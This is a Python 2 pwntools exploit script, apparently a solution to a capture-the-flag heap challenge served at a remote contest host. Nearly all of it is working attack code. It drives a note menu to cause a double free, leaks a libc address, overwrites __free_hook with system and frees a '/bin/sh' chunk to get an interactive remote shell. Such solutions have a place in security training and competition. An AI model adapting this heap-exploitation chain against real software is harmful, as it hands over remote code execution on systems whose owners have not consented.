#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

# for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
#     signal.signal(sig, clear)
    
# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''
    
#     '''

#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
# except Exception as e:
#     print(e)

context.arch = 'amd64'
# context.arch = 'i386'
context.log_level = 'debug'
execve_file = './chall'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
# sh = process(execve_file)
sh = remote('hitme.tasteless.eu', 10601)
# sh = remote('localhost', 1000)
elf = ELF(execve_file)
libc = ELF('./libc-2.29.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    def pr
        x/8gx $rebase(0x4060)
        end
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    pass

def add(size, content):
    sh.sendlineafter('> ', 'a')
    sh.sendlineafter('size?', str(size))
    sh.sendlineafter('format? ', 'z')
    sh.sendafter(' note:\n', content)

def edit(index, size, content):
    sh.sendlineafter('> ', 'e')
    sh.sendlineafter('id?', str(index))
    sh.sendlineafter('size?', str(size))
    sh.sendafter(' note:\n', content)

def delete(index):
    sh.sendlineafter('> ', 'd')
    sh.sendlineafter('id?', str(index))

def show(index):
    sh.sendlineafter('> ', 's')
    sh.sendlineafter('id?', str(index))

add(0x17, '\n')
add(0x98, '\n')
add(0x98, '\n')
delete(0)
edit(0, 0x37, '\xff' * 0x30)
delete(0)


delete(1)
add(0x98, '\n')
show(0)

sh.recvn(9)
libc_addr = u64(sh.recvn(8)) - 0x1e4ca0
log.success('libc_addr: ' + hex(libc_addr))

add(0x200, p64(0) * 2 + p64(libc_addr + libc.symbols['__free_hook'] - 8))
add(0x30, '/bin/sh\0' + p64(libc_addr + libc.symbols['system']))

delete(3)

sh.interactive()
clear()